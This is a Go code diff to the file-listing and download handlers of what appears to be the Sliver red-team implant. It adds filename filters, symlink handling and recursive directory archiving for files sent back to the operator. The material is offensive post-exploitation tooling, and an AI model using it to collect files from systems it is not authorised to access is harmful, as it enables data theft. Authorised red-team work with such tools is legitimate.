@@ -82,6 +82,58 @@ func pingHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func determineDirPathFilter(targetPath string) (string, string) {
+	// The filter
+	filter := ""
+
+	// The path the filter applies to
+	path := ""
+
+	/*
+		Check to see if the remote path is a filter or contains a filter.
+		If the path passes the test to be a filter, then it is a filter
+		because paths are not valid filters.
+	*/
+	if targetPath != "." {
+
+		// Check if the path contains a filter
+		// Test on a standardized version of the path (change any \ to /)
+		testPath := strings.Replace(targetPath, "\\", "/", -1)
+		/*
+			Cannot use the path or filepath libraries because the OS
+			of the client does not necessarily match the OS of the
+			implant
+		*/
+		lastSeparatorOccurrence := strings.LastIndex(testPath, "/")
+
+		if lastSeparatorOccurrence == -1 {
+			// Then this is only a filter
+			filter = targetPath
+			path = "."
+		} else {
+			// Then we need to test for a filter on the end of the string
+
+			// The indicies should be the same because we did not change the length of the string
+			path = targetPath[:lastSeparatorOccurrence+1]
+			filter = targetPath[lastSeparatorOccurrence+1:]
+		}
+	} else {
+		path = targetPath
+		// filter remains blank
+	}
+
+	return path, filter
+}
+
+func pathIsDirectory(path string) bool {
+	fileInfo, err := os.Stat(path)
+	if err != nil {
+		return false
+	} else {
+		return fileInfo.IsDir()
+	}
+}
+
 func dirListHandler(data []byte, resp RPCResponse) {
 	dirListReq := &sliverpb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
@@ -91,7 +143,19 @@ func dirListHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	dir, files, err := getDirList(dirListReq.Path)
+
+	// Handle the case where a directory is provided without a trailing separator
+	var targetPath string
+
+	if pathIsDirectory(dirListReq.Path) {
+		targetPath = dirListReq.Path + "/"
+	} else {
+		targetPath = dirListReq.Path
+	}
+
+	path, filter := determineDirPathFilter(targetPath)
+
+	dir, files, err := getDirList(path)
 
 	// Convert directory listing to protobuf
 	timezone, offset := time.Now().Zone()
@@ -102,19 +166,47 @@ func dirListHandler(data []byte, resp RPCResponse) {
 		dirList.Exists = false
 	}
 	dirList.Files = []*sliverpb.FileInfo{}
+
+	var match bool = false
+	var linkPath string = ""
+
 	for _, fileInfo := range files {
-		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
-			Name:  fileInfo.Name(),
-			IsDir: fileInfo.IsDir(),
-			Size:  fileInfo.Size(),
-			/* Send the time back to the client / server as the number of seconds
-			since epoch.  This will decouple formatting the time to display from the
-			time itself.  We can change the format of the time displayed in the client
-			and not have to worry about having to update implants.
-			*/
-			ModTime: fileInfo.ModTime().Unix(),
-			Mode:    fileInfo.Mode().String(),
-		})
+		if filter == "" {
+			match = true
+		} else {
+			match, err = filepath.Match(filter, fileInfo.Name())
+			if err != nil {
+				// Then this is a bad filter, and it will be a bad filter
+				// on every iteration of the loop, so we might as well break now
+				break
+			}
+		}
+
+		if match {
+			// Check if this is a symlink, and if so, add the path the link points to
+			if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+				linkPath, err = filepath.EvalSymlinks(path + fileInfo.Name())
+				if err != nil {
+					linkPath = ""
+				}
+			} else {
+				linkPath = ""
+			}
+
+			dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
+				Name:  fileInfo.Name(),
+				IsDir: fileInfo.IsDir(),
+				Size:  fileInfo.Size(),
+				/* Send the time back to the client / server as the number of seconds
+				since epoch.  This will decouple formatting the time to display from the
+				time itself.  We can change the format of the time displayed in the client
+				and not have to worry about having to update implants.
+				*/
+				ModTime: fileInfo.ModTime().Unix(),
+				Mode:    fileInfo.Mode().String(),
+				Link:    linkPath,
+			})
+		}
 	}
 
 	// Send back the response
@@ -274,6 +366,29 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func prepareDownload(path string, filter string, recurse bool) ([]byte, bool, int, int, error) {
+	/*
+		Combine the path and filter to see if the user wants
+		to download a single file
+	*/
+	fileInfo, err := os.Stat(path + filter)
+	if err == nil && !fileInfo.IsDir() {
+		// Then this is a single file
+		rawData, err := os.ReadFile(path + filter)
+		if err != nil {
+			// Then we could not read the file
+			return nil, false, 0, 1, err
+		} else {
+			return rawData, false, 1, 0, nil
+		}
+	}
+
+	// If we are here, then the user wants multiple files (a directory or part of a directory)
+	var downloadData bytes.Buffer
+	readFiles, unreadableFiles, err := compressDir(path, filter, recurse, &downloadData)
+	return downloadData.Bytes(), true, readFiles, unreadableFiles, err
+}
+
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
 	var rawData []byte
@@ -283,6 +398,8 @@ func downloadHandler(data []byte, resp RPCResponse) {
 		this download is being looted
 	*/
 	var isDir bool
+
+	var download *sliverpb.Download
 
 	downloadReq := &sliverpb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
@@ -294,48 +411,42 @@ func downloadHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	target, _ := filepath.Abs(downloadReq.Path)
-	fi, err := os.Stat(target)
-	if err != nil {
-		//{{if .Config.Debug}}
-		log.Printf("stat failed on %s: %v", target, err)
-		//{{end}}
-		download := &sliverpb.Download{Path: target, Exists: false}
-		download.Response = &commonpb.Response{
-			Err: err.Error(),
-		}
-		data, err = proto.Marshal(download)
-		resp(data, err)
-		return
-	}
-	if fi.IsDir() {
-		var dirData bytes.Buffer
-		err = compressDir(target, &dirData)
-		// {{if .Config.Debug}}
-		log.Printf("error creating the archive: %v", err)
-		// {{end}}
-		rawData = dirData.Bytes()
-		isDir = true
-	} else {
-		rawData, err = ioutil.ReadFile(target)
-		isDir = false
+
+	if pathIsDirectory(target) {
+		// Even if the implant is running on Windows, Go can deal with "/" as a path separator
+		target += "/"
 	}
 
-	var download *sliverpb.Download
-	if err == nil {
+	path, filter := determineDirPathFilter(target)
+
+	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse)
+
+	if err != nil {
+		if isDir {
+			// {{if .Config.Debug}}
+			log.Printf("error creating the archive: %v", err)
+			// {{end}}
+		} else {
+			//{{if .Config.Debug}}
+			log.Printf("error while preparing download for %s: %v", target, err)
+			//{{end}}
+		}
+		download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: int32(readFiles), UnreadableFiles: int32(unreadableFiles)}
+		download.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+	} else {
 		gzipData := bytes.NewBuffer([]byte{})
 		gzipWrite(gzipData, rawData)
 		download = &sliverpb.Download{
-			Path:     target,
-			Data:     gzipData.Bytes(),
-			Encoder:  "gzip",
-			Exists:   true,
-			IsDir:    isDir,
-			Response: &commonpb.Response{},
-		}
-	} else {
-		download = &sliverpb.Download{Path: target, Exists: false}
-		download.Response = &commonpb.Response{
-			Err: fmt.Sprintf("%v", err),
+			Path:            target,
+			Data:            gzipData.Bytes(),
+			Encoder:         "gzip",
+			Exists:          true,
+			IsDir:           isDir,
+			ReadFiles:       int32(readFiles),
+			UnreadableFiles: int32(unreadableFiles),
+			Response:        &commonpb.Response{},
 		}
 	}
 
@@ -660,50 +771,152 @@ func standarizeArchiveFileName(path string) string {
 	}
 }
 
-func compressDir(path string, buf io.Writer) error {
+func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, int, error) {
 	zipWriter := gzip.NewWriter(buf)
 	tarWriter := tar.NewWriter(zipWriter)
+	readFiles := 0
+	unreadableFiles := 0
+	var matchingFiles []string
 
-	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
+	/*
+		There is an edge case where if you are trying to download a junction on Windows,
+		you will get access denied
+
+		To resolve this, we will resolve the junction or symlink before we do anything.
+		Even though resolving the symlink first is not necessary on *nix, it does not hurt
+		and will make it so that we do not have to detect if we are on Windows.
+	*/
+	pathInfo, err := os.Lstat(path)
+	if err != nil {
+		return readFiles, unreadableFiles, err
+	}
+
+	if pathInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+		path, err = filepath.EvalSymlinks(path)
+		if err != nil {
+			return readFiles, unreadableFiles, err
+		}
+		// The path we get back from EvalSymlinks does not have a trailing separator
+		// Forward slash is fine even on Windows.
+		path += "/"
+	}
+
+	/*
+		Build the list of files to include in the archive.
+
+		Walking the directory can take a long time and do a lot of unnecessary work
+		if we do not need to recurse through subdirectories.
+
+		If we are not recursing, then read the directory without worrying about
+		subdirectories.
+	*/
+	if !recurse {
+		testPath := strings.ReplaceAll(path, "\\", "/")
+		directory, err := os.Open(path)
+		if err != nil {
+			return readFiles, unreadableFiles, err
+		}
+		directoryFiles, err := directory.Readdirnames(0)
+		directory.Close()
+		if err != nil {
+			return readFiles, unreadableFiles, err
+		}
+
+		for _, fileName := range directoryFiles {
+			standardFileName := strings.ReplaceAll(testPath+fileName, "\\", "/")
+			if filter != "" {
+				match, err := filepath.Match(testPath+filter, standardFileName)
+				if err == nil && match {
+					matchingFiles = append(matchingFiles, standardFileName)
+				}
+			} else {
+				matchingFiles = append(matchingFiles, standardFileName)
+			}
+		}
+	} else {
+		filepath.WalkDir(path, func(file string, d os.DirEntry, err error) error {
+			filePath := strings.ReplaceAll(file, "\\", "/")
+			if filter != "" {
+				// Normalize paths
+				testPath := strings.ReplaceAll(filepath.Dir(file), "\\", "/") + "/"
+				match, matchErr := filepath.Match(testPath+filter, filePath)
+				if !match || matchErr != nil {
+					// If there is an error, it is because the filter is bad, so it is not a match
+					return nil
+				}
+				matchingFiles = append(matchingFiles, file)
+			} else {
+				matchingFiles = append(matchingFiles, file)
+			}
+			return nil
+		})
+	}
+
+	for _, file := range matchingFiles {
+		fi, err := os.Stat(file)
+		if err != nil {
+			// Cannot get info on the file, so skip it
+			unreadableFiles += 1
+			continue
+		}
+
 		fileName := standarizeArchiveFileName(file)
 
 		// If the file is a SymLink replace fileInfo and path with the symlink destination.
 		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
 			file, err = filepath.EvalSymlinks(file)
 			if err != nil {
-				return err
+				unreadableFiles += 1
+				continue
 			}
 
 			fi, err = os.Lstat(file)
 			if err != nil {
-				return err
+				unreadableFiles += 1
+				continue
 			}
 		}
+
 		header, err := tar.FileInfoHeader(fi, file)
 		if err != nil {
-			return err
+			unreadableFiles += 1
+			continue
 		}
 		// Keep the symlink file path for the header name.
 		header.Name = filepath.ToSlash(fileName)
-		if err := tarWriter.WriteHeader(header); err != nil {
-			return err
-		}
+		// Check that we can open the file before we try to write it to the archive
 		if !fi.IsDir() {
 			data, err := os.Open(file)
 			if err != nil {
-				return err
+				// Skip this file and do not write it to the archive.
+				unreadableFiles += 1
+				continue
+			}
+			if err := tarWriter.WriteHeader(header); err != nil {
+				unreadableFiles += 1
+				data.Close()
+				continue
 			}
 			if _, err := io.Copy(tarWriter, data); err != nil {
-				return err
+				unreadableFiles += 1
+				data.Close()
+				continue
+			}
+			data.Close()
+			readFiles += 1
+		} else {
+			if err := tarWriter.WriteHeader(header); err != nil {
+				unreadableFiles += 1
+				continue
 			}
 		}
-		return nil
-	})
+	}
+
 	if err := tarWriter.Close(); err != nil {
-		return err
+		return readFiles, unreadableFiles, err
 	}
 	if err := zipWriter.Close(); err != nil {
-		return err
+		return readFiles, unreadableFiles, err
 	}
-	return nil
+	return readFiles, unreadableFiles, nil
 }
